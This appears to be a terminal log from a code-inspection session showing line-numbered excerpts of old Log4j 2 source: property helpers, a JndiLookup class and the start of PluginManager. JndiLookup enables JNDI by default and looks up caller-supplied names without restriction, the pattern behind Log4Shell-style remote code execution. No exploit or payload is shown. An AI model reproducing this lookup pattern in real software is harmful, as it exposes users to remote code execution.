[2;36m                    [0m         [1;36m47[0m[39m:            [0m[1;39m}[0m[39m finally [0m[1;39m{[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:                try [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:                    [0m[1;35min.close[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:                [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal IOException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:                    [0m[35m/[0m[35m/[0m[39m ignored[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;39m}[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    public static PropertiesUtil [0m[1;35mgetProperties[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        return LOG4J_PROPERTIES;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public String [0m[1;35mgetStringProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        String prop = null;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            prop = [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            [0m[35m/[0m[35m/[0m[39m Ignore[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? [0m[1;35mprops.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : prop;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:    public int [0m[1;35mgetIntegerProperty[0m[1;39m([0m[39mfinal String name, final int defaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:        String prop = null;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            prop = [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:            [0m[35m/[0m[35m/[0m[39m Ignore[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:        if [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:            prop = [0m[1;35mprops.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        if [0m[1;39m([0m[39mprop != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:                return [0m[1;35mInteger.parseInt[0m[1;39m([0m[39mprop[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:                return defaultValue;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:        return defaultValue;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:    public long [0m[1;35mgetLongProperty[0m[1;39m([0m[39mfinal String name, final long defaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:        String prop = null;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:            prop = [0m[1;35mSystem.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:            [0m[35m/[0m[35m/[0m[39m Ignore[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:        if [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:            prop = [0m[1;35mprops.getProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        if [0m[1;39m([0m[39mprop != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:            try [0m[1;39m{[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:                return [0m[1;35mLong.parseLong[0m[1;39m([0m[39mprop[0m[1;39m)[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:                return defaultValue;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:        return defaultValue;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:    public String [0m[1;35mgetStringProperty[0m[1;39m([0m[39mfinal String name, final String [0m            [2m                [0m
[2;36m                    [0m         [39mdefaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:        final String prop = [0m[1;35mgetStringProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? defaultValue : prop;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        return [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mname, false[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:    public boolean [0m[1;35mgetBooleanProperty[0m[1;39m([0m[39mfinal String name, final boolean [0m         [2m                [0m
[2;36m                    [0m         [39mdefaultValue[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        final String prop = [0m[1;35mgetStringProperty[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:        return [0m[1;39m([0m[39mprop == null[0m[1;39m)[0m[39m ? defaultValue : [0m[32m"true"[0m[1;35m.equalsIgnoreCase[0m[1;39m([0m[39mprop[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m126[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m127[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m128[0m[39m:     * Return the system properties or an empty Properties object if an error [0m  [2m                [0m
[2;36m                    [0m         [39moccurs.[0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m129[0m[39m:     * @return The system properties.[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m130[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m131[0m[39m:    public static Properties [0m[1;35mgetSystemProperties[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m132[0m[39m:        try [0m[1;39m{[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m133[0m[39m:            return new [0m[1;35mProperties[0m[1;39m([0m[1;35mSystem.getProperties[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m134[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal SecurityException ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m135[0m[39m:            [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[1;35m.error[0m[1;39m([0m[32m"Unable to access system [0m            [2m                [0m
[2;36m                    [0m         [32mproperties."[0m[1;39m)[0m[39m;[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m136[0m[39m:            [0m[35m/[0m[35m/[0m[39m Sandboxed - can't read System Properties[0m                         [2m                [0m
[2;36m                    [0m         [1;36m137[0m[39m:            return new [0m[1;35mProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m138[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m139[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m140[0m[39m:[0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:31[0m[39m-[0m[1;36m87[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/plugins/PluginManager.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m1[0m[39m-[0m[1;36m80[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.config.plugins;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.io.BufferedInputStream;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.io.BufferedOutputStream;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.io.DataInputStream;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import java.io.DataOutputStream;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import java.io.File;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import java.io.FileOutputStream;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import java.io.IOException;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import java.io.InputStream;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import java.net.URL;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import java.text.DecimalFormat;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import java.util.Enumeration;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:import java.util.concurrent.ConcurrentHashMap;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:import java.util.concurrent.ConcurrentMap;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:import java.util.concurrent.CopyOnWriteArrayList;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:import org.apache.logging.log4j.core.helpers.Loader;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m: * Loads and manages all the plugins.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:public class PluginManager [0m[1;39m{[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    private static final long NANOS_PER_SECOND = 1000000000L;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    private static ConcurrentMap<String, ConcurrentMap<String, PluginType>> [0m     [2m                [0m
[2;36m                    [0m         [39mpluginTypeMap =[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        new ConcurrentHashMap<String, ConcurrentMap<String, PluginType>>[0m[1;39m([0m[1;39m)[0m[39m;[0m      [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:    private static final CopyOnWriteArrayList<String> PACKAGES = new [0m            [2m                [0m
[2;36m                    [0m         [39mCopyOnWriteArrayList<String>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    private static final String PATH = [0m                                          [2m                [0m
[2;36m                    [0m         [32m"org/apache/logging/log4j/core/config/plugins/"[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    private static final String FILENAME = [0m[32m"Log4j2Plugins.dat"[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    private static final String LOG4J_PACKAGES = [0m                                [2m                [0m
[2;36m                    [0m         [32m"org.apache.logging.log4j.core"[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    private static String rootDir;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    private Map<String, PluginType> plugins = new HashMap<String, PluginType>[0m[1;39m([0m[1;39m)[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    private final String type;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    private final Class<?> clazz;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:     * Constructor that takes only a type name.[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     * @param type The type name.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    public [0m[1;35mPluginManager[0m[1;39m([0m[39mfinal String type[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        this.type = type;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        this.clazz = null;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:     * Constructor that takes a type name and a Class.[0m                           [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * @param type The type that must be matched.[0m                                [2m                [0m
